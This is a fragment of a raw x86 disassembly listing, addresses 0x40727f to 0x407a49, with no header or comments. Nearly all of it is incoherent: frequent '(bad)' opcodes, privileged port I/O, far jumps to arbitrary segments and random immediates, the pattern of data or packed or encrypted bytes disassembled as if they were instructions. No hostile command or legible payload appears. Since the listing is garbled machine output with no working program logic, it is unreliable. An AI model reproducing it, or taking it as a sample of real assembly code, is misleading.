  40727f:	outs   dx,BYTE PTR ds:[esi]
  407280:	ss pop edi
  407282:	cmp    bh,BYTE PTR [ebx+0x381c9d4]
  407288:	xor    DWORD PTR [ecx],0xffffff86
  40728b:	in     eax,0x96
  40728d:	jle    0x40722c
  40728f:	pop    ds
  407290:	push   eax
  407291:	jnp    0x407225
  407293:	mov    ch,0x49
  407295:	fdiv   QWORD PTR [esi+esi*2-0xd]
  407299:	aaa    
  40729a:	int    0x2a
  40729c:	mov    al,0xf0
  40729e:	mov    al,ds:0xb8cd6240
  4072a3:	xor    BYTE PTR [edi-0x45d800f1],bl
  4072a9:	mov    BYTE PTR [edi+0x61],al
  4072ac:	cmp    BYTE PTR [edx+eax*4+0x59],dh
  4072b0:	or     BYTE PTR [edi],bl
  4072b2:	xchg   edi,eax
  4072b3:	loop   0x407331
  4072b5:	(bad)  
  4072b6:	cli    
  4072b7:	inc    esp
  4072b8:	mov    esi,DWORD PTR [esi-0x4d]
  4072bb:	dec    sp
  4072bd:	jecxz  0x407301
  4072bf:	je     0x4072a2
  4072c1:	mov    WORD PTR [esi-0x6e08b116],gs
  4072c7:	btr    DWORD PTR ds:[ebx],eax
  4072cb:	outs   dx,BYTE PTR ds:[esi]
  4072cc:	mov    BYTE PTR [esi-0xc],ch
  4072cf:	jb     0x407298
  4072d1:	mov    ds:0xb0119b40,al
  4072d6:	pop    es
  4072d7:	dec    ecx
  4072d8:	xchg   BYTE PTR [edi-0x6c],al
  4072db:	add    dl,ah
  4072dd:	adc    cl,cl
  4072df:	lock shr ebx,0xee
  4072e3:	cmc    
  4072e4:	pop    edx
  4072e5:	dec    edx
  4072e6:	call   0xe565f64b
  4072eb:	pop    esp
  4072ec:	test   BYTE PTR [ebx],bl
  4072ee:	loopne 0x4072be
  4072f0:	(bad)  
  4072f1:	jb     0x40730f
  4072f3:	test   DWORD PTR [edx-0x146f371e],ebx
  4072f9:	hlt    
  4072fa:	jns    0x4072f6
  4072fc:	mov    esp,0x5ef23126
  407301:	sub    ebx,DWORD PTR [eax+0x5334c7ed]
  407307:	in     al,0xeb
  407309:	fisubr DWORD PTR [ecx+0x26]
  40730c:	ins    DWORD PTR es:[edi],dx
  40730d:	mov    WORD PTR [ebx-0x35c44563],fs
  407313:	dec    bx
  407315:	push   ds
  407316:	ins    DWORD PTR es:[edi],dx
  407317:	jecxz  0x40732a
  407319:	pop    ss
  40731a:	mov    ebp,0x9d248e66
  40731f:	or     eax,DWORD PTR [esi+0x5c]
  407322:	sbb    eax,0xe0b49172
  407327:	mov    DWORD PTR [ecx],eax
  407329:	xchg   DWORD PTR [ecx+ebp*8],eax
  40732c:	(bad)  
  40732d:	adc    eax,0x5871dca1
  407332:	cmovs  esp,DWORD PTR [ecx-0x2]
  407336:	lds    edx,FWORD PTR [edi+0x4ac7bb77]
  40733c:	xchg   ecx,eax
  40733d:	xchg   esi,eax
  40733e:	sahf   
  40733f:	sbb    al,0xdb
  407341:	int    0x1f
  407343:	inc    edi
  407344:	ret    0xef78
  407347:	dec    ebp
  407348:	aam    0x79
  40734a:	and    BYTE PTR [esi],cl
  40734c:	jne    0x4072d5
  40734e:	scas   eax,DWORD PTR es:[edi]
  40734f:	xchg   esi,eax
  407350:	pushf  
  407351:	jecxz  0x4073c6
  407353:	es push edx
  407355:	ds cli 
  407357:	loope  0x4073be
  407359:	adc    al,0xd7
  40735b:	dec    ebp
  40735c:	mov    edx,0xccee9048
  407361:	push   0xffffff8b
  407363:	fs mov cl,0x6f
  407366:	sub    eax,0xfdf07b6a
  40736b:	scas   eax,DWORD PTR es:[edi]
  40736c:	mov    ebp,0x60cef8a0
  407371:	(bad)  
  407372:	sub    eax,0xe447f9d9
  407377:	push   edx
  407378:	sbb    esp,ebx
  40737a:	sti    
  40737b:	adc    DWORD PTR [edx+0x26],esp
  40737e:	inc    ebx
  40737f:	adc    esi,DWORD PTR [esi+0x54]
  407382:	std    
  407383:	cmp    cl,BYTE PTR [edi-0x30]
  407386:	dec    ebp
  407387:	and    BYTE PTR [edx+edi*8+0x4d],dl
  40738b:	in     al,dx
  40738c:	cmp    eax,0x4e4e650c
  407391:	sar    al,cl
  407393:	mov    al,ds:0x547cfcd
  407398:	setl   BYTE PTR [ebp-0x54617f6c]
  40739f:	sti    
  4073a0:	out    dx,al
  4073a1:	mov    cl,0xa1
  4073a3:	pop    eax
  4073a4:	inc    DWORD PTR [edx+eiz*8-0x51]
  4073a8:	xor    edx,DWORD PTR [ebx*1+0xae26331]
  4073af:	xchg   ecx,eax
  4073b0:	pop    esi
  4073b1:	fs je  0x4073ea
  4073b4:	iret   
  4073b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073b6:	push   cs
  4073b7:	fsub   st(0),st
  4073b9:	add    DWORD PTR [eax],edi
  4073bb:	and    al,0x61
  4073bd:	aas    
  4073be:	lea    ebp,[ebx-0x938325]
  4073c4:	(bad)  
  4073c5:	pop    esi
  4073c6:	fsub   DWORD PTR [eax+0x1ecab9da]
  4073cc:	adc    dh,BYTE PTR [edi-0xcff942a]
  4073d2:	jecxz  0x407416
  4073d4:	imul   ecx,edx,0x3895799b
  4073da:	xor    al,0x90
  4073dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073dd:	push   esp
  4073de:	fadd   DWORD PTR [ebx]
  4073e0:	hlt    
  4073e1:	ss push ss
  4073e3:	jmp    0x4ebffb28
  4073e8:	add    eax,0xd489f8e6
  4073ed:	leave  
  4073ee:	add    al,0x42
  4073f0:	jg     0x4073df
  4073f2:	add    ebx,DWORD PTR [edi-0x72c7e796]
  4073f8:	dec    edi
  4073f9:	cmp    BYTE PTR [esp+ebp*8+0x67],dl
  4073fd:	dec    esp
  4073fe:	cli    
  4073ff:	sbb    bh,ah
  407401:	cs xchg edx,eax
  407403:	scas   eax,DWORD PTR es:[edi]
  407404:	dec    ebp
  407405:	les    eax,FWORD PTR [ecx-0x36f0d4c5]
  40740b:	sub    cl,BYTE PTR [ebp-0x77]
  40740e:	fwait
  40740f:	das    
  407410:	cmp    esi,edx
  407412:	sbb    ah,BYTE PTR [ecx-0x7]
  407415:	pop    es
  407416:	add    bh,BYTE PTR [edi-0x5a74d441]
  40741c:	das    
  40741d:	cmp    ah,BYTE PTR [bx+di]
  407420:	mov    edi,0xb8621ef4
  407425:	sub    edx,DWORD PTR [esi+0x6]
  407428:	bound  edi,QWORD PTR [esi+0x55d55e3a]
  40742e:	(bad)  
  407430:	stos   DWORD PTR es:[edi],eax
  407431:	in     al,dx
  407432:	(bad)  
  407433:	sbb    bl,al
  407435:	popf   
  407436:	iret   
  407437:	shl    DWORD PTR [esi],1
  407439:	sbb    BYTE PTR ds:0x64a6b0c0,cl
  40743f:	and    al,0xe0
  407441:	mov    ds:0x56e1a406,al
  407446:	test   eax,0x4a0f04b5
  40744b:	add    al,0x19
  40744d:	loope  0x407415
  40744f:	fwait
  407450:	test   BYTE PTR ds:0x869c18db,bh
  407456:	std    
  407457:	adc    DWORD PTR [ebp+0x65],ebx
  40745a:	xor    BYTE PTR [ebx+0x62],bl
  40745d:	and    al,dh
  40745f:	test   al,al
  407461:	adc    BYTE PTR [eax+0x17],0xd2
  407465:	addr16 aas 
  407467:	sbb    eax,0xf20aa95e
  40746c:	mov    ebx,0x370da807
  407471:	pop    esi
  407472:	gs jmp 0x40742b
  407475:	cdq    
  407476:	les    esi,FWORD PTR [ebp+0x1941aa7b]
  40747c:	loopne 0x407489
  40747e:	push   eax
  40747f:	gs ins DWORD PTR es:[edi],dx
  407481:	aaa    
  407482:	and    ch,BYTE PTR [ebp-0x76]
  407485:	mov    dh,0x83
  407487:	jno    0x4074e5
  407489:	ss and ebp,eax
  40748c:	test   DWORD PTR es:[esi],ecx
  40748f:	iret   
  407490:	or     DWORD PTR [ecx-0x508413eb],edx
  407496:	neg    BYTE PTR [eax+0x2c]
  407499:	sub    eax,0x89dfbef1
  40749e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40749f:	fwait
  4074a0:	and    al,dl
  4074a2:	nop
  4074a3:	js     0x407490
  4074a5:	jmp    0xf0e29507
  4074aa:	cwde   
  4074ab:	test   DWORD PTR [edi+0xae7ed79],ebp
  4074b1:	mov    esi,0xa62d24b
  4074b6:	sbb    DWORD PTR [eax+0x757438d9],edx
  4074bc:	xchg   edi,eax
  4074bd:	dec    edx
  4074be:	into   
  4074bf:	cmp    DWORD PTR [ebx],ecx
  4074c1:	and    al,0x11
  4074c3:	inc    edx
  4074c4:	ss dec ecx
  4074c6:	jns    0x407493
  4074c8:	out    dx,eax
  4074c9:	mul    esp
  4074cb:	cmp    al,0x38
  4074cd:	inc    ecx
  4074ce:	pop    ds
  4074cf:	sar    esp,cl
  4074d1:	sbb    BYTE PTR [ecx],al
  4074d3:	and    al,0x1c
  4074d5:	arpl   WORD PTR [esi+ebp*2],sp
  4074d8:	(bad)  
  4074d9:	fmul   DWORD PTR [eax]
  4074db:	lahf   
  4074dc:	jno    0x4074f4
  4074de:	fsubr  DWORD PTR [ebx]
  4074e0:	jge    0x407474
  4074e2:	mov    edi,0x9a161a5a
  4074e7:	stos   DWORD PTR es:[edi],eax
  4074e8:	fstp   QWORD PTR [esi]
  4074ea:	stos   BYTE PTR es:[edi],al
  4074eb:	push   0xd24976e5
  4074f0:	jmp    0xa97a:0xf5adc0c7
  4074f7:	add    al,0xdb
  4074f9:	push   edi
  4074fa:	shl    BYTE PTR [edi+0x13],0x29
  4074fe:	and    BYTE PTR [edi-0x10874206],cl
  407504:	xchg   BYTE PTR [ebx+0x43],al
  407507:	mov    eax,ecx
  407509:	xchg   esi,eax
  40750a:	jns    0x407572
  40750c:	or     ebx,DWORD PTR [ebp+ecx*4-0x77]
  407510:	and    DWORD PTR [ebp-0x57171a6b],edi
  407516:	(bad)  
  407517:	adc    DWORD PTR [edx+0x7b],edx
  40751a:	in     al,0x4d
  40751c:	xlat   BYTE PTR ds:[ebx]
  40751d:	xchg   ebp,eax
  40751e:	push   eax
  40751f:	jo     0x407599
  407521:	(bad)  
  407522:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407523:	add    DWORD PTR [ecx+0xf],esp
  407526:	xor    eax,0x1afa1d8f
  40752b:	(bad)  
  40752c:	xchg   BYTE PTR ds:[ebx+0x7f9c6a67],ah
  407533:	xchg   ebp,eax
  407534:	cmp    eax,0x89142e8
  407539:	mov    WORD PTR [ebp+0x474d423],ss
  40753f:	and    al,0x65
  407541:	inc    eax
  407542:	xor    DWORD PTR [edx],0xfffffffb
  407545:	add    DWORD PTR [edi+0x6f2927c8],edi
  40754b:	mov    ds:0xb481e6fb,al
  407550:	pop    ecx
  407551:	inc    ecx
  407552:	fsub   DWORD PTR [ebp+0x1b]
  407555:	mov    esi,0xa49e4e3
  40755a:	lock xor al,0x6e
  40755d:	in     al,0xf4
  40755f:	shl    BYTE PTR [ecx],cl
  407561:	into   
  407562:	push   ebp
  407563:	jge    0x40758b
  407565:	fstp   QWORD PTR [ecx+eax*2+0x7cdf1860]
  40756c:	push   ebp
  40756d:	in     eax,0x7b
  40756f:	ficom  DWORD PTR [edi]
  407571:	(bad)  
  407572:	mov    edi,0xd1bbc64d
  407577:	push   ebp
  407578:	in     al,0x1c
  40757a:	pop    ecx
  40757b:	nop
  40757c:	dec    esi
  40757d:	sub    ecx,ebx
  40757f:	jle    0x407506
  407581:	mov    esi,0x93f628f7
  407586:	adc    DWORD PTR [ecx],ebx
  407588:	mov    bh,0x1f
  40758a:	mov    eax,DWORD PTR [esi+0x42d970de]
  407590:	es mov eax,0xacd3a80a
  407596:	shl    BYTE PTR [edx],0x5a
  407599:	xacquire xchg BYTE PTR [edx-0xb],dl
  40759d:	retf   0x86c8
  4075a0:	ins    BYTE PTR es:[edi],dx
  4075a1:	int    0xd2
  4075a3:	jl     0x4075ed
  4075a5:	fs out dx,al
  4075a7:	xchg   ecx,eax
  4075a8:	mov    ebp,0xae81e9ff
  4075ad:	adc    DWORD PTR [edx+0xf194f83],0x3a
  4075b4:	ret    
  4075b5:	cmp    dh,al
  4075b7:	shl    ecx,1
  4075b9:	xlat   BYTE PTR ds:[ebx]
  4075ba:	or     BYTE PTR [ebp-0x43dfea2a],0x82
  4075c1:	jle    0x4075ef
  4075c3:	sbb    eax,DWORD PTR [esi]
  4075c5:	aas    
  4075c6:	push   esi
  4075c7:	and    DWORD PTR [edi],ecx
  4075c9:	pop    edi
  4075ca:	das    
  4075cb:	fwait
  4075cc:	inc    esp
  4075cd:	jmp    0x1419:0xc21a48f4
  4075d4:	xor    eax,0x2a88fc6c
  4075d9:	mov    edx,0x86b75059
  4075de:	icebp  
  4075df:	jmp    0xc0fb8dd3
  4075e4:	mov    ds,WORD PTR [edi+0x7bc18e01]
  4075ea:	dec    edi
  4075eb:	ror    DWORD PTR [esi-0x53],cl
  4075ee:	pop    edi
  4075ef:	pop    esp
  4075f0:	ret    0x2036
  4075f3:	cmp    eax,ebp
  4075f5:	push   ecx
  4075f6:	mov    ch,0x9c
  4075f8:	xchg   ecx,eax
  4075f9:	cmc    
  4075fa:	fadd   DWORD PTR [edi]
  4075fc:	stos   DWORD PTR es:[edi],eax
  4075fd:	or     eax,esp
  4075ff:	mov    ds:0x808fd53e,eax
  407604:	scas   al,BYTE PTR es:[edi]
  407605:	ja     0x407622
  407607:	(bad)  
  407608:	shl    BYTE PTR [edi+0x67],1
  40760b:	lds    ebx,FWORD PTR [edx+0x7b]
  40760e:	jl     0x4075d4
  407610:	(bad)  
  407611:	cmp    ebx,DWORD PTR [ebp-0x63]
  407614:	stc    
  407615:	inc    esi
  407616:	push   ecx
  407617:	xchg   ch,bh
  407619:	outs   dx,DWORD PTR ds:[esi]
  40761a:	sub    edx,DWORD PTR [edi-0x528ed78f]
  407620:	xor    BYTE PTR [esi-0x8],bl
  407623:	sub    ebx,DWORD PTR [esi]
  407625:	mov    es,esi
  407627:	jl     0x407605
  407629:	aas    
  40762a:	adc    DWORD PTR [eax-0xf9856b2],esi
  407630:	ds cdq 
  407632:	iret   
  407633:	sbb    eax,0x196938b3
  407638:	shr    DWORD PTR [ecx+0x12],0x51
  40763c:	and    DWORD PTR ds:0xd4e148cd,edi
  407642:	aam    0xdc
  407644:	xor    BYTE PTR [ecx-0x30],cl
  407647:	test   BYTE PTR [ebp+0x6c215047],bl
  40764d:	cmp    DWORD PTR [edx+0x533760a],eax
  407653:	cld    
  407654:	cmp    esi,esp
  407656:	cmp    eax,0x41760f12
  40765b:	leave  
  40765c:	lahf   
  40765d:	cmp    bl,ch
  40765f:	jg     0x4075f1
  407661:	mov    ah,0x40
  407663:	sub    eax,ebp
  407665:	or     eax,0x76ccda8b
  40766a:	sub    edi,DWORD PTR [ebx+0x6841ba0c]
  407670:	sbb    DWORD PTR [ecx],edx
  407672:	inc    esi
  407673:	sub    dl,BYTE PTR [ebx]
  407675:	or     eax,0x2a9e63c3
  40767a:	lahf   
  40767b:	mov    al,0xcc
  40767d:	ror    DWORD PTR [edx-0x64e9d689],0xe2
  407684:	sbb    DWORD PTR [ebx+0x679b4774],ecx
  40768a:	dec    ebx
  40768b:	jmp    0x8459:0xe5406bf
  407692:	bound  edx,QWORD PTR [ecx]
  407694:	test   BYTE PTR [esi+0x5ebf92f8],bl
  40769a:	add    eax,0xfe34217b
  40769f:	jl     0x4076d1
  4076a1:	enter  0x99ea,0xeb
  4076a5:	mov    cl,0xae
  4076a7:	push   ds
  4076a8:	sub    al,0x49
  4076aa:	mov    edi,0xf98cd933
  4076af:	out    0xf1,eax
  4076b1:	push   ebx
  4076b2:	xor    ch,al
  4076b4:	in     eax,0xf7
  4076b6:	je     0x407640
  4076b8:	mov    cl,0x17
  4076ba:	xchg   ebx,esi
  4076bc:	mov    ds:0xb52c2a94,al
  4076c1:	xor    DWORD PTR [ecx-0x28],edx
  4076c4:	mov    al,ds:0xac40f931
  4076c9:	push   edi
  4076ca:	mov    al,0x22
  4076cc:	push   ebx
  4076cd:	out    0x43,eax
  4076cf:	retf   
  4076d0:	test   BYTE PTR [eax-0x30ec4c81],0xc4
  4076d7:	jge    0x40765a
  4076d9:	xor    ebp,DWORD PTR [ebp+esi*1+0x59]
  4076dd:	enter  0x4a8b,0x7c
  4076e1:	pop    ebp
  4076e2:	push   ss
  4076e3:	sahf   
  4076e4:	inc    ebx
  4076e5:	stc    
  4076e6:	dec    esi
  4076e7:	push   es
  4076e8:	scas   eax,DWORD PTR es:[edi]
  4076e9:	pop    es
  4076ea:	pop    esi
  4076eb:	xchg   ecx,eax
  4076ec:	mul    BYTE PTR [edx+ebp*4-0x36]
  4076f0:	loope  0x4076d3
  4076f2:	xchg   BYTE PTR [ebx],ah
  4076f4:	xor    ebx,eax
  4076f6:	and    BYTE PTR [ecx],0x44
  4076f9:	aad    0x78
  4076fb:	in     eax,0xd7
  4076fd:	xor    ebx,0xabf1a7e3
  407703:	mov    eax,0xb1fd0b51
  407708:	in     al,0x95
  40770a:	push   cs
  40770b:	inc    esp
  40770c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40770d:	(bad)  
  40770e:	(bad)  
  40770f:	fwait
  407710:	jb     0x4076ad
  407712:	sub    edi,DWORD PTR [edi-0x74]
  407715:	mov    cl,0x68
  407717:	cwde   
  407718:	test   eax,0x313ada93
  40771d:	scas   al,BYTE PTR es:[edi]
  40771e:	inc    eax
  40771f:	jno    0x407748
  407721:	nop
  407722:	pop    ds
  407723:	pop    ebx
  407724:	retf   0x6728
  407727:	push   ds
  407728:	hlt    
  407729:	sbb    BYTE PTR [eax],bl
  40772b:	rcl    DWORD PTR [ebp+0x57c12357],0x9a
  407732:	into   
  407733:	sbb    al,0x75
  407735:	and    ecx,esp
  407737:	mov    gs,ebp
  407739:	stos   BYTE PTR es:[edi],al
  40773a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40773b:	popa   
  40773c:	cmc    
  40773d:	add    dl,dl
  40773f:	lods   eax,DWORD PTR ds:[esi]
  407740:	dec    eax
  407741:	ret    
  407742:	sbb    dl,BYTE PTR [edi]
  407744:	aam    0x8f
  407746:	je     0x407777
  407748:	shl    DWORD PTR [eax],0x8c
  40774b:	or     cl,BYTE PTR [eax+0x2adaf7a8]
  407751:	mov    eax,ds:0x667bb1f1
  407756:	inc    ebp
  407757:	jb     0x407796
  407759:	xor    cl,al
  40775b:	sbb    edi,edx
  40775d:	ret    0x5063
  407760:	sbb    eax,ebp
  407762:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407764:	stc    
  407765:	jg     0x407794
  407767:	pushw  0xfff6
  40776a:	call   0xce8dd052
  40776f:	pop    ebp
  407770:	fcomp  QWORD PTR [edx]
  407772:	nop
  407773:	adc    ebp,DWORD PTR [ebx+0x1e]
  407776:	jmp    0xe7384b62
  40777b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40777c:	cdq    
  40777d:	jl     0x4077f6
  40777f:	pushf  
  407780:	xor    DWORD PTR [ebx-0x467ffbb],eax
  407786:	pop    es
  407787:	fnstenv [edx-0x5ad612e8]
  40778d:	inc    esp
  40778e:	cwde   
  40778f:	add    al,0xf0
  407791:	xchg   ebx,eax
  407792:	addr16 in al,dx
  407794:	(bad)  
  407795:	in     ax,dx
  407797:	les    ebp,FWORD PTR [edi+0x6d430a12]
  40779d:	mov    ds:0x5c5bd562,eax
  4077a2:	jmp    0xfaa2a002
  4077a7:	sub    eax,0x25ce23d3
  4077ac:	jle    0x40775a
  4077ae:	or     edi,DWORD PTR [eax+0x15acab6b]
  4077b4:	cmp    BYTE PTR [ebp+edi*2-0x7dd26f24],bh
  4077bb:	cmp    ch,dl
  4077bd:	jl     0x4077b1
  4077bf:	ror    DWORD PTR [esi],cl
  4077c1:	aas    
  4077c2:	add    dl,BYTE PTR [eax-0x33]
  4077c5:	cwde   
  4077c6:	xor    BYTE PTR [eax],ch
  4077c8:	icebp  
  4077c9:	dec    ecx
  4077ca:	lahf   
  4077cb:	jbe    0x4077e6
  4077cd:	std    
  4077ce:	(bad)  
  4077cf:	mov    esp,DWORD PTR [edx+ebx*4-0xde8fecf]
  4077d6:	mov    bl,0x60
  4077d8:	test   al,0x59
  4077da:	push   esp
  4077db:	pop    ds
  4077dc:	(bad)  
  4077dd:	out    0x36,al
  4077df:	fxch   st(7)
  4077e1:	lea    esi,[ecx]
  4077e3:	mov    cs,esi
  4077e5:	inc    ebp
  4077e6:	jno    0x4077dd
  4077e8:	aas    
  4077e9:	sub    al,0x66
  4077eb:	test   BYTE PTR [ebx+0x6a8f4ae3],bh
  4077f1:	int3   
  4077f2:	mov    bh,0x87
  4077f4:	push   edx
  4077f5:	popf   
  4077f6:	loope  0x4077fb
  4077f8:	(bad)  
  4077f9:	ror    bl,cl
  4077fb:	and    BYTE PTR [ecx-0x39],ah
  4077fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077ff:	pushf  
  407800:	pop    edi
  407801:	daa    
  407802:	hlt    
  407803:	or     al,0x2
  407805:	mov    eax,ebx
  407807:	mov    ah,0x2
  407809:	test   BYTE PTR [edi+ebp*1],ch
  40780c:	loopne 0x407856
  40780e:	in     al,dx
  40780f:	lods   al,BYTE PTR ds:[esi]
  407810:	(bad)  
  407811:	or     DWORD PTR [ebx-0x39],ebp
  407814:	outs   dx,BYTE PTR ds:[esi]
  407815:	sbb    cl,bl
  407817:	mov    ds:0x54cd76fd,eax
  40781c:	xchg   edi,eax
  40781d:	or     al,0x62
  40781f:	stos   DWORD PTR es:[edi],eax
  407820:	call   0x930afe0e
  407825:	hlt    
  407826:	fbstp  TBYTE PTR [edi]
  407828:	pop    ds
  407829:	mov    bl,0x7
  40782b:	inc    edx
  40782c:	(bad)  
  40782d:	lods   al,BYTE PTR es:[esi]
  40782f:	imul   esp,DWORD PTR [esi-0x495bdd23],0x21
  407836:	dec    esp
  407837:	inc    eax
  407838:	outs   dx,BYTE PTR ds:[esi]
  407839:	(bad)  
  40783a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40783b:	add    eax,0xc03238d
  407840:	jne    0x407835
  407842:	or     ebx,esp
  407844:	ss mov bh,0xcb
  407847:	mov    esi,0xe0e28b40
  40784c:	hlt    
  40784d:	or     esp,DWORD PTR [eax+0x28]
  407850:	inc    edx
  407851:	xor    DWORD PTR [ebp+0x5827f898],ecx
  407857:	adc    dh,ch
  407859:	call   0x389f:0x8cb12c24
  407860:	jge    0x407892
  407862:	push   esi
  407863:	mov    bl,0x78
  407865:	sub    esp,DWORD PTR ds:0xcccfd40
  40786b:	pusha  
  40786c:	pushf  
  40786d:	pusha  
  40786e:	or     BYTE PTR [edx+0x44],dh
  407871:	sub    DWORD PTR [ecx-0x2e775430],ecx
  407877:	js     0x4078dc
  407879:	sub    bl,BYTE PTR [ecx+0x6723ae3b]
  40787f:	test   BYTE PTR [edi+eax*2+0x29d09504],ch
  407886:	fild   WORD PTR [ebp-0x20]
  407889:	cwde   
  40788a:	rol    BYTE PTR [edi],0xa3
  40788d:	out    dx,al
  40788e:	jne    0x4078a9
  407890:	aam    0x1a
  407892:	aaa    
  407893:	pop    ds
  407894:	mov    al,ds:0x1ecde142
  407899:	ds cld 
  40789b:	mov    eax,0x66b9d54d
  4078a0:	rol    ah,cl
  4078a2:	xchg   ebx,eax
  4078a3:	or     BYTE PTR [eax+0x45],bh
  4078a6:	or     BYTE PTR [eax],cl
  4078a8:	fsub   QWORD PTR ds:0x43297eb7
  4078ae:	xor    BYTE PTR [ebx-0x20],al
  4078b1:	xchg   ebp,eax
  4078b2:	add    al,BYTE PTR [ebx+eiz*4-0x15ab7216]
  4078b9:	rol    BYTE PTR [edx],cl
  4078bb:	xor    eax,0xddb1d179
  4078c0:	(bad)  
  4078c2:	cdq    
  4078c3:	aad    0xd4
  4078c5:	test   esp,ebp
  4078c7:	mov    bl,0x43
  4078c9:	out    dx,al
  4078ca:	iret   
  4078cb:	shr    DWORD PTR [ebx-0x4c],cl
  4078ce:	xor    DWORD PTR [ebx+0x1],esi
  4078d1:	add    ch,BYTE PTR [edx+0x6f0bc570]
  4078d7:	push   edx
  4078d8:	imul   ecx,DWORD PTR [edi+0x4],0x15
  4078dc:	pusha  
  4078dd:	inc    esp
  4078de:	add    ch,bl
  4078e0:	sti    
  4078e1:	ja     0x4078ab
  4078e3:	cld    
  4078e4:	les    ebp,FWORD PTR [ebx+0x40]
  4078e7:	or     dh,BYTE PTR [eax-0x4e0d9cae]
  4078ed:	dec    ebp
  4078ee:	xor    al,0xa5
  4078f0:	or     ebp,DWORD PTR [edi]
  4078f2:	sbb    DWORD PTR [edi-0x6c8374ff],esp
  4078f8:	leave  
  4078f9:	ret    
  4078fa:	push   ecx
  4078fb:	(bad)  
  4078fc:	sub    BYTE PTR ds:0x95fcc01f,ah
  407902:	addr16 mov ecx,0x81e8fbfc
  407908:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407909:	dec    edi
  40790a:	shr    cl,0x26
  40790d:	shr    DWORD PTR [esi],1
  40790f:	es push esi
  407911:	sbb    al,0x1b
  407913:	test   eax,0x42e95a1b
  407918:	mov    dh,0x1
  40791a:	retf   
  40791b:	js     0x4078d5
  40791d:	pop    esi
  40791e:	cwde   
  40791f:	lea    edx,[ecx-0x49837f6e]
  407925:	sub    DWORD PTR [eax],edi
  407927:	push   ebp
  407928:	mov    ah,0x1f
  40792a:	das    
  40792b:	dec    esi
  40792c:	fldenv [ebp-0x393d40b0]
  407932:	aaa    
  407933:	iret   
  407934:	inc    ecx
  407935:	xor    eax,0x2aac0a93
  40793a:	inc    edi
  40793b:	test   BYTE PTR [esi+0x52989714],bh
  407941:	mov    al,0x58
  407943:	jmp    0x3a5f:0x934b67cb
  40794a:	mov    ch,0x90
  40794c:	mov    esi,0x1c03776
  407951:	mov    ch,BYTE PTR [ecx-0x197bfa1d]
  407957:	mov    edx,0xa193b699
  40795c:	repnz pop esp
  40795e:	mov    bh,0x36
  407960:	xchg   BYTE PTR [ecx+0x4603f861],al
  407966:	mov    ds:0xacb4225d,eax
  40796b:	popf   
  40796c:	rcl    BYTE PTR [eax-0x61],cl
  40796f:	std    
  407970:	jp     0x4079d4
  407972:	out    dx,al
  407973:	push   edi
  407974:	jl     0x407901
  407976:	cdq    
  407977:	mov    ebp,0x7107d240
  40797c:	pop    ds
  40797d:	push   ss
  40797e:	ins    DWORD PTR es:[edi],dx
  40797f:	push   esp
  407980:	dec    ebx
  407981:	or     al,0x68
  407983:	pop    eax
  407984:	fwait
  407985:	loope  0x4079a8
  407987:	adc    BYTE PTR [ecx-0x29],cl
  40798a:	in     al,dx
  40798b:	cmp    eax,edx
  40798d:	ins    DWORD PTR es:[edi],dx
  40798e:	jnp    0x4079c3
  407990:	retf   
  407991:	sub    ch,ch
  407993:	lahf   
  407994:	sbb    BYTE PTR [eax-0x1c],cl
  407997:	mov    edx,0x7e61d1fc
  40799c:	adc    DWORD PTR [ebx-0x5d],esp
  40799f:	pop    ecx
  4079a0:	sbb    DWORD PTR [ecx-0x58ebb77],edx
  4079a6:	xor    esi,DWORD PTR [edx-0x69dbda4]
  4079ac:	and    BYTE PTR ds:0x4d553f47,0x87
  4079b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079b4:	popa   
  4079b5:	ins    BYTE PTR es:[edi],dx
  4079b6:	dec    esi
  4079b7:	dec    ebx
  4079b8:	cmp    BYTE PTR [ebx],al
  4079ba:	mov    cl,0x51
  4079bc:	xchg   DWORD PTR [eax],ebp
  4079be:	adc    al,0x62
  4079c0:	call   0x865c768e
  4079c5:	and    BYTE PTR [ebx+0x6f03c44a],dl
  4079cb:	push   edx
  4079cc:	rcl    DWORD PTR [ecx],0x22
  4079cf:	fwait
  4079d0:	call   0x73c7:0xf75df516
  4079d7:	(bad)  
  4079d8:	push   ebp
  4079d9:	out    0x42,al
  4079db:	ss push 0x3
  4079de:	jmp    0x407a5d
  4079e0:	in     eax,0xb1
  4079e2:	mov    ecx,0x53c1edd6
  4079e7:	lock sar dl,1
  4079ea:	pop    esi
  4079eb:	jmp    0x4079ad
  4079ed:	jnp    0x407998
  4079ef:	mov    ah,0x99
  4079f1:	jnp    0x4079d2
  4079f3:	cwde   
  4079f4:	or     DWORD PTR [ecx-0x2ad1db17],ebx
  4079fa:	dec    edi
  4079fb:	repz cmp eax,DWORD PTR [edx+edi*2-0x32]
  407a00:	mov    esi,esp
  407a02:	bswap  ebx
  407a04:	pop    esi
  407a05:	pop    esi
  407a06:	or     bh,BYTE PTR [ebx+edx*2]
  407a09:	mov    al,0xee
  407a0b:	xor    eax,0x5c35df8c
  407a10:	mov    dl,0x2e
  407a12:	repz xchg edi,eax
  407a14:	add    esi,DWORD PTR [edx+0x5599099e]
  407a1a:	and    ebx,DWORD PTR [ecx]
  407a1c:	aaa    
  407a1d:	or     bh,0x4d
  407a20:	iret   
  407a21:	inc    edx
  407a22:	leave  
  407a23:	(bad)  
  407a24:	imul   DWORD PTR [ebp+0x56]
  407a27:	sbb    al,0xb9
  407a29:	push   eax
  407a2a:	xchg   ebp,eax
  407a2b:	pop    edi
  407a2c:	push   esp
  407a2d:	ins    DWORD PTR es:[edi],dx
  407a2e:	push   0xb58100d8
  407a33:	jp     0x407a26
  407a35:	inc    edx
  407a36:	xor    al,0x7b
  407a38:	(bad)  
  407a39:	sub    ebp,DWORD PTR [ebp+0x7f]
  407a3c:	jbe    0x407a5f
  407a3e:	jmp    FWORD PTR [ecx+ebp*2]
  407a41:	shr    BYTE PTR [edx-0x40df7d7d],0xb8
  407a48:	dec    ecx
  407a49:	jae    0x4079d4
